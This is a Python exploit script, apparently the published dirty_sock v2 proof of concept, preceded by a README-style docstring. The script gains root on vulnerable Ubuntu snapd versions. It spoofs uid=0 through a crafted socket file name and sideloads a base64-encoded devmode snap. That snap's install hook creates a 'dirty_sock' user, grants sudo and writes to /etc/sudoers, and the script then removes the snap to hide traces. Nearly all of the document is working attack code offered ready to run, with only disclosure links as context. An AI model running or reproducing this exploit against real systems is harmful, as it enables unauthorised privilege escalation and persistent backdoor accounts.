#!/usr/bin/env python3

"""
# dirty_sock: Privilege Escalation in Ubuntu (via snapd)
In January 2019, current versions of Ubuntu Linux were found to be vulnerable to local privilege escalation due to a bug in the snapd API. This repository contains the original exploit POC, which is being made available for research and education. For a detailed walkthrough of the vulnerability and the exploit, please refer to the <a href="https://initblog.com/2019/dirty-sock/" target="_blank"> blog posting here</a>.

You can easily check if your system is vulnerable. Run the command below. If your `snapd` is 2.37.1 or newer, you are safe.
```
$ snap version
...
snapd   2.37.1
...
```

# Usage
## Version One (use in most cases)
This exploit bypasses access control checks to use a restricted API function (POST /v2/create-user) of the local snapd service. This queries the Ubuntu SSO for a username and public SSH key of a provided email address, and then creates a local user based on these value.

Successful exploitation for this version requires an outbound Internet connection and an SSH service accessible via localhost.

To exploit, first create an account at the <a href="https://login.ubuntu.com/" target="_blank">Ubuntu SSO</a>. After confirming it, edit your profile and upload an SSH public key. Then, run the exploit like this (with the SSH private key corresponding to public key you uploaded):

```
python3 ./dirty_sockv1.py -u "you@yourmail.com" -k "id_rsa"

[+] Slipped dirty sock on random socket file: /tmp/ktgolhtvdk;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Sending payload...
[+] Success! Enjoy your new account with sudo rights!

[Script will automatically ssh to localhost with the SSH key here]
```

## Version Two (use in special cases)
This exploit bypasses access control checks to use a restricted API function (POST /v2/snaps) of the local snapd service. This allows the installation of arbitrary snaps. Snaps in "devmode" bypass the sandbox and may include an "install hook" that is run in the context of root at install time.

dirty_sockv2 leverages the vulnerability to install an empty "devmode" snap including a hook that adds a new user to the local system. This user will have permissions to execute sudo commands.

As opposed to version one, this does not require the SSH service to be running. It will also work on newer versions of Ubuntu with no Internet connection at all, making it resilient to changes and effective in restricted environments.

This exploit should also be effective on non-Ubuntu systems that have installed snapd but that do not support the "create-user" API due to incompatible Linux shell syntax.

Some older Ubuntu systems (like 16.04) may not have the snapd components installed that are required for sideloading. If this is the case, this version of the exploit may trigger it to install those dependencies. During that installation, snapd may upgrade itself to a non-vulnerable version. Testing shows that the exploit is still successful in this scenario. See the troubleshooting section for more details.

To exploit, simply run the script with no arguments on a vulnerable system.

```
python3 ./dirty_sockv2.py

[+] Slipped dirty sock on random socket file: /tmp/gytwczalgx;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...

********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************

```


# Troubleshooting
If using version two, and the exploit completes but you don't see your new account, this may be due to some background snap updates. You can view these by executing `snap changes` and then `snap change #`, referencing the line showing the install of the dirty_sock snap. Eventually, these should complete and your account should be usable.

Version 1 seems to be the easiest and fastest, if your environment supports it (SSH service running and accessible from localhost).

Please open issues for anything weird.

# Disclosure Info
The issue was reported directly to the snapd team via Ubuntu's bug tracker. You can read the full thread <a href="https://bugs.launchpad.net/snapd/+bug/1813365" target="_blank">here</a>.

I was very impressed with Canonical's response to this issue. The team was awesome to work with, and overall the experience makes me feel very good about being an Ubuntu user myself.

Public advisory links:
- https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SnapSocketParsing
- https://usn.ubuntu.com/3887-1/


Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46361.zip
"""

"""
Local privilege escalation via snapd, affecting Ubuntu and others.

v2 of dirty_sock leverages the /v2/snaps API to sideload an empty snap
with an install hook that creates a new user.

v1 is recommended is most situations as it is less intrusive.

Simply run as is, no arguments, no requirements. If the exploit is successful,
the system will have a new user with sudo permissions as follows:
  username: dirty_sock
  password: dirty_sock

You can execute su dirty_sock when the exploit is complete. See the github page
for troubleshooting.

Research and POC by initstring (https://github.com/initstring/dirty_sock)
"""

import string
import random
import socket
import base64
import time
import sys
import os

BANNER = r'''
      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//

'''


# The following global is a base64 encoded string representing an installable
# snap package. The snap itself is empty and has no functionality. It does,
# however, have a bash-script in the install hook that will create a new user.
# For full details, read the blog linked on the github page above.
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '==')

def check_args():
    """Return short help if any args given"""
    if len(sys.argv) > 1:
        print("\n\n"
              "No arguments needed for this version. Simply run and enjoy."
              "\n\n")
        sys.exit()

def create_sockfile():
    """Generates a random socket file name to use"""
    alphabet = string.ascii_lowercase
    random_string = ''.join(random.choice(alphabet) for i in range(10))
    dirty_sock = ';uid=0;'

    # This is where we slip on the dirty sock. This makes its way into the
    # UNIX AF_SOCKET's peer data, which is parsed in an insecure fashion
    # by snapd's ucrednet.go file, allowing us to overwrite the UID variable.
    sockfile = '/tmp/' + random_string + dirty_sock

    print("[+] Slipped dirty sock on random socket file: " + sockfile)

    return sockfile

def bind_sock(sockfile):
    """Binds to a local file"""
    # This exploit only works if we also BIND to the socket after creating
    # it, as we need to inject the dirty sock as a remote peer in the
    # socket's ancillary data.
    print("[+] Binding to socket file...")
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.bind(sockfile)

    # Connect to the snap daemon
    print("[+] Connecting to snapd API...")
    client_sock.connect('/run/snapd.socket')

    return client_sock

def delete_snap(client_sock):
    """Deletes the trojan snap, if installed"""
    post_payload = ('{"action": "remove",'
                    ' "snaps": ["dirty-sock"]}')
    http_req = ('POST /v2/snaps HTTP/1.1\r\n'
                'Host: localhost\r\n'
                'Content-Type: application/json\r\n'
                'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                + post_payload)

    # Send our payload to the snap API
    print("[+] Deleting trojan snap (and sleeping 5 seconds)...")
    client_sock.sendall(http_req.encode("utf-8"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on probably-not-vulnerable
    if '"status":"Unauthorized"' in http_reply:
        print("[!] System may not be vulnerable, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    # Exit on failure
    if 'status-code":202' not in http_reply:
        print("[!] Did not work, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    # We sleep to allow the API command to complete, otherwise the install
    # may fail.
    time.sleep(5)

def install_snap(client_sock):
    """Sideloads the trojan snap"""

    # Decode the base64 from above back into bytes
    blob = base64.b64decode(TROJAN_SNAP)

    # Configure the multi-part form upload boundary here:
    boundary = '------------------------f8c156143a1caf97'

    # Construct the POST payload for the /v2/snap API, per the instructions
    # here: https://github.com/snapcore/snapd/wiki/REST-API
    # This follows the 'sideloading' process.
    post_payload = '''
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="devmode"

true
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="snap"; filename="snap.snap"
Content-Type: application/octet-stream

''' + blob.decode('latin-1') + '''
--------------------------f8c156143a1caf97--'''


    # Multi-part forum uploads are weird. First, we post the headers
    # and wait for an HTTP 100 reply. THEN we can send the payload.
    http_req1 = ('POST /v2/snaps HTTP/1.1\r\n'
                 'Host: localhost\r\n'
                 'Content-Type: multipart/form-data; boundary='
                 + boundary + '\r\n'
                 'Expect: 100-continue\r\n'
                 'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')

    # Send the headers to the snap API
    print("[+] Installing the trojan snap (and sleeping 8 seconds)...")
    client_sock.sendall(http_req1.encode("utf-8"))

    # Receive the initial HTTP/1.1 100 Continue reply
    http_reply = client_sock.recv(8192).decode("utf-8")

    if 'HTTP/1.1 100 Continue' not in http_reply:
        print("[!] Error starting POST conversation, here is the reply:\n\n")
        print(http_reply)
        sys.exit()

    # Now we can send the payload
    http_req2 = post_payload
    client_sock.sendall(http_req2.encode("latin-1"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on failure
    if 'status-code":202' not in http_reply:
        print("[!] Did not work, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    # Sleep to allow time for the snap to install correctly. Otherwise,
    # The uninstall that follows will fail, leaving unnecessary traces
    # on the machine.
    time.sleep(8)

def print_success():
    """Prints a success message if we've made it this far"""
    print("\n\n")
    print("********************")
    print("Success! You can now `su` to the following account and use sudo:")
    print("   username: dirty_sock")
    print("   password: dirty_sock")
    print("********************")
    print("\n\n")


def main():
    """Main program function"""

    # Gotta have a banner...
    print(BANNER)

    # Check for any args (none needed)
    check_args()

    # Create a random name for the dirty socket file
    sockfile = create_sockfile()

    # Bind the dirty socket to the snapdapi
    client_sock = bind_sock(sockfile)

    # Delete trojan snap, in case there was a previous install attempt
    delete_snap(client_sock)

    # Install the trojan snap, which has an install hook that creates a user
    install_snap(client_sock)

    # Delete the trojan snap
    delete_snap(client_sock)

    # Remove the dirty socket file
    os.remove(sockfile)

    # Congratulate the lucky hacker
    print_success()


if __name__ == '__main__':
    main()